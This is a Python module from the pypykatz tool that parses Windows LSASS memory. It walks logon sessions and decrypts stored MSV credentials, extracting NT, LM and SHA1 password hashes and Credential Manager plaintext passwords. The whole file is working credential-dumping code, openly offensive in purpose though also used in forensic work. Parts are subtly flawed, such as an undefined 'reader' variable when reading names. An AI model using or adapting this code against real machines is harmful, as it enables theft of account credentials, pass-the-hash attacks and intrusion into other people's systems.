#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import json
import logging
from pypykatz.commons.common import *
from pypykatz.commons.filetime import *
from pypykatz.commons.win_datatypes import *
from pypykatz.lsadecryptor.packages.msv.templates import *
from pypykatz.lsadecryptor.packages.credman.templates import *
from pypykatz.lsadecryptor.package_commons import *

class MsvCredential:
	def __init__(self):
		self.username = None
		self.domainname = None
		self.NThash = None
		self.LMHash = None
		self.SHAHash = None
		
		
	def to_dict(self):
		t = {}
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['NThash'] = self.NThash
		t['LMHash'] = self.LMHash
		t['SHAHash'] = self.SHAHash
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict(), cls=UniversalEncoder)
		
	def __str__(self):
		t = '\t== MSV ==\n'
		t += '\t\tUsername: %s\n' % (self.username if self.username else 'NA')
		t += '\t\tDomain: %s\n' % (self.domainname if self.domainname else 'NA')
		t += '\t\tLM: %s\n' % (self.LMHash.hex() if self.LMHash else 'NA')
		t += '\t\tNT: %s\n' % (self.NThash.hex() if self.NThash else 'NA')
		t += '\t\tSHA1: %s\n' % (self.SHAHash.hex() if self.SHAHash else 'NA')
		return t
		
class CredmanCredential:
	def __init__(self):
		self.credtype = 'credman'
		self.luid = None
		self.username = None
		self.password = None
		self.domain = None

	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domain'] = self.domain
		t['password'] = self.password
		t['luid'] = self.luid
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== CREDMAN [%x]==\n' % self.luid
		t += '\t\tluid %s\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomain %s\n' % self.domain
		t += '\t\tpassword %s\n' % self.password
		return t
		
		
class LogonSession:
	def __init__(self):
		self.authentication_id = None
		self.session_id = None
		self.username = None
		self.domainname = None
		self.logon_server = None
		self.logon_time = None
		self.sid = None
		self.luid = None
		
		self.msv_creds = []
		self.wdigest_creds = []
		self.ssp_creds = []
		self.livessp_creds = []
		self.dpapi_creds = []
		self.kerberos_creds = []
		self.credman_creds = []
		self.tspkg_creds = []
	
	@staticmethod
	def parse(entry, reader):
		"""
		Converts KIWI_MSV1_0_LIST type objects into a unified class
		"""
		lsc = LogonSession()
		lsc.authentication_id = entry.LocallyUniqueIdentifier
		lsc.session_id = entry.Session
		lsc.username = entry.UserName.read_string(reader)
		lsc.domainname = entry.Domaine.read_string(reader)
		lsc.logon_server = entry.LogonServer.read_string(reader)
		if entry.LogonTime != 0:
			lsc.logon_time = filetime_to_dt(entry.LogonTime).isoformat()
		lsc.sid = str(entry.pSid.read(reader))
		lsc.luid = entry.LocallyUniqueIdentifier
		return lsc
		
	def to_dict(self):
		t = {}
		t['authentication_id'] = self.authentication_id
		t['session_id'] = self.session_id
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['logon_server'] = self.logon_server
		t['logon_time'] = self.logon_time
		t['sid'] = self.sid
		t['luid'] = self.luid
		t['msv_creds']  = []
		t['wdigest_creds']  = []
		t['ssp_creds']  = []
		t['livessp_creds']  = []
		t['dpapi_creds']  = []
		t['kerberos_creds']  = []
		t['credman_creds']  = []
		t['tspkg_creds']  = []
		for cred in self.msv_creds:
			t['msv_creds'].append(cred.to_dict())
		for cred in self.wdigest_creds:
			t['wdigest_creds'].append(cred.to_dict())
		for cred in self.ssp_creds:
			t['ssp_creds'].append(cred.to_dict())
		for cred in self.livessp_creds:
			t['livessp_creds'].append(cred.to_dict())
		for cred in self.dpapi_creds:
			t['dpapi_creds'].append(cred.to_dict())
		for cred in self.kerberos_creds:
			t['kerberos_creds'].append(cred.to_dict())
		for cred in self.credman_creds:
			t['credman_creds'].append(cred.to_dict())
		for cred in self.tspkg_creds:
			t['tspkg_creds'].append(cred.to_dict())
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict(), cls=UniversalEncoder)
	
	def __str__(self):
		t = '== LogonSession ==\n'
		t += 'authentication_id %s (%x)\n' % (self.authentication_id, self.authentication_id)
		t += 'session_id %s\n' % self.session_id
		t += 'username %s\n' % self.username
		t += 'domainname %s\n' % self.domainname
		t += 'logon_server %s\n' % self.logon_server
		t += 'logon_time %s\n' % self.logon_time
		t += 'sid %s\n' % self.sid
		t += 'luid %s\n' % self.luid
		if len(self.msv_creds) > 0:
			for cred in self.msv_creds:
				t+= '%s' % str(cred)
		if len(self.wdigest_creds) > 0:
			for cred in self.wdigest_creds:
				t+= str(cred)
		if len(self.ssp_creds) > 0:
			for cred in self.ssp_creds:
				t+= str(cred)
		if len(self.livessp_creds) > 0:
			for cred in self.livessp_creds:
				t+= str(cred)
		if len(self.kerberos_creds) > 0:
			for cred in self.kerberos_creds:
				t+= str(cred)
		if len(self.wdigest_creds) > 0:
			for cred in self.wdigest_creds:
				t+= str(cred)
		if len(self.credman_creds) > 0:
			for cred in self.credman_creds:
				t+= str(cred)
		if len(self.tspkg_creds) > 0:
			for cred in self.tspkg_creds:
				t+= str(cred)
		if len(self.dpapi_creds) > 0:
			for cred in self.dpapi_creds:
				t+= str(cred)
		return t
		
class MsvDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, credman_template, sysinfo):
		super().__init__('Msv', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credman_decryptor_template = credman_template
		self.entries = []
		self.entries_seen = {}
		self.logon_sessions = {}
		
		self.current_logonsession = None

	def find_first_entry(self):
		position = self.find_signature('lsasrv.dll',self.decryptor_template.signature)
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	def add_entry(self, entry):
		self.current_logonsession = LogonSession.parse(entry, self.reader)
		if entry.CredentialManager.value != 0:
			self.parse_credman_credentials(entry)
		
		if entry.Credentials_list_ptr.value != 0:			
			self.walk_list(entry.Credentials_list_ptr, self.add_credentials)
		else:
			self.log('No credentials in this structure!')
		
		self.logon_sessions[self.current_logonsession.luid] = self.current_logonsession
		
	def add_credentials(self, primary_credentials_list_entry):
		self.walk_list(
			primary_credentials_list_entry.PrimaryCredentials_ptr, 
			self.add_primary_credentials
		)
		
	def parse_credman_credentials(self, logon_session):
		self.log_ptr(logon_session.CredentialManager.value, 'KIWI_CREDMAN_SET_LIST_ENTRY')
		credman_set_list_entry = logon_session.CredentialManager.read(self.reader, override_finaltype = KIWI_CREDMAN_SET_LIST_ENTRY)
		self.log_ptr(credman_set_list_entry.list1.value, 'KIWI_CREDMAN_LIST_STARTER')
		list_starter = credman_set_list_entry.list1.read(self.reader, override_finaltype = KIWI_CREDMAN_LIST_STARTER)
		if list_starter.start.value != list_starter.start.location:
			self.walk_list(list_starter.start, self.add_credman_credential, override_ptr = self.credman_decryptor_template.list_entry)
		
	def add_credman_credential(self, credman_credential_entry):
		
		c = CredmanCredential()
		c.username = credman_credential_entry.user.read_string(self.reader)
		c.domainname = credman_credential_entry.server2.read_string(self.reader)
		
		if credman_credential_entry.cbEncPassword and credman_credential_entry.cbEncPassword != 0:
			enc_data = credman_credential_entry.encPassword.read_raw(self.reader, credman_credential_entry.cbEncPassword)
			c.password = self.decrypt_password(enc_data)
		
		c.luid = self.current_logonsession.luid
			
		self.current_logonsession.credman_creds.append(c)
		
	
	def add_primary_credentials(self, primary_credentials_entry):
		
		encrypted_credential_data = primary_credentials_entry.encrypted_credentials.read_data(self.reader)
		
		self.log('Encrypted credential data \n%s' % hexdump(encrypted_credential_data))
		self.log('Decrypting credential structure')
		dec_data = self.decrypt_password(encrypted_credential_data, bytes_expected = True)
		self.log('%s: \n%s' % (self.decryptor_template.decrypted_credential_struct.__name__, hexdump(dec_data)))
			
		if len(dec_data) == MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC.size and dec_data[4:8] == b'\xcc\xcc\xcc\xcc':
			creds_struct = MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC(GenericReader(dec_data, self.sysinfo.architecture))
		else:
			creds_struct = self.decryptor_template.decrypted_credential_struct(GenericReader(dec_data, self.sysinfo.architecture))
		
		
		cred = MsvCredential()
		
		if creds_struct.UserName:
			try:
				cred.username = creds_struct.UserName.read_string(reader)
			except Exception as e:
				self.log('Failed to get username')
		if creds_struct.LogonDomainName:
			try:
				cred.domainname = creds_struct.LogonDomainName.read_string(reader)
			except Exception as e:
				self.log('Failed to get username')
				
		cred.NThash = creds_struct.NtOwfPassword
		
		if creds_struct.LmOwfPassword and creds_struct.LmOwfPassword != b'\x00'*16:
			cred.LMHash = creds_struct.LmOwfPassword
		cred.SHAHash = creds_struct.ShaOwPassword		
		
		self.current_logonsession.msv_creds.append(cred)
	
	def start(self):
		entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, self.add_entry)

